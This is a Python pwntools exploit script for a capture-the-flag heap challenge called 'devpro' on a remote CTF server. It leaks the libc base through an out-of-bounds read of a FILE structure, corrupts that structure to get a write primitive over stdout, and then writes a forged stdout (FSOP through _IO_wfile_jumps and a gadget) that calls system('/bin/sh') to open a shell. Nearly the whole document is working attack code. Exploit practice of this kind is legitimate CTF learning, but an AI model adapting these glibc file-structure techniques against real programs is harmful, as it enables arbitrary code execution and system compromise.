#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("devpro_patched")
libc = ELF("./libc.so.6")

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


host ,port = 'blackhat.flagyard.com','31704'
if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

def open(idx):
  sla('> ', '1')
  sla('> ', str(idx))

def close():
  sla('> ', '5')

def alloc(size):
  sla('> ', '2')
  sla('Size: ', str(size))

def read():
  sla('> ', '3')

def write(data):
  sla('> ', '4')
  sla('Data: ', enhex(data)+'-')

def leakpos(pos):
  for i in range(pos):
    p.recv(3)
  leak = 0
  for i in range(8):
    leak += (u8(unhex(p.recv(2))))<<(i*8)
    p.recv(1)
  return leak

# first we alloc a 0x400 chunk
alloc(0x400)
# open null device
open(2)
# alloc 0x500 chunk (will fails,but will modifiy size)
alloc(0x500)
# oob read of file structure after our 0x400 chunk (will leak libc addresses)
read()
# got our leak & calculate libc base
leak = leakpos(1144)
logleak('leak',leak)
libc.address = leak-0x21a6a0
logbase()

#Â close device
close()
# open zero device (this one spits zeroes)
open(3)
# try to alloc 0x439 bytes (will fails,but will modifiy size), 
# overwrite with zeroes beginning of file structure
# that will zero the lsb of buffer base where data is stored when writing, 
# and will permit you to write data inside the file structure
alloc(0x439)
read()
# modify the file structure to overwrite the filedescriptor entry to zero
# now it will read input from stdin, instead of an useless device
write( p64(0)*3+p64(libc.sym['_IO_2_1_stderr_'])+p8(0) )

# this payload will change the buffer addresses in file structure to use it as a write primitive
# we will write over stdout in libc like this
payload = b'\x00'*0x408+p64(0x1e1)+p64(0x5fbad2483)+p64(0)*4+p64(libc.sym['_IO_2_1_stdout_'])+p64(libc.sym['_IO_2_1_stdout_']+232)*2+p64(libc.sym['_IO_2_1_stdout_']+233)
print('len = '+str(len(payload)))
# failed alloc to modify size to the size of our payload
alloc(len(payload))
# write payload (yes a read is a write in this case)
read()
p.send(payload)

# from this point what we write will be written in stdout
# so we will prepare a FSOP payload
# https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc#3---the-fsop-way-targetting-stdout

# some constants
stdout_lock = libc.address + 0x21ba70   # _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = libc.address + 0x0000000000163830  # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

# write our fake stdout over the real one
write( bytes(fake))

# enjoy shell
p.interactive()

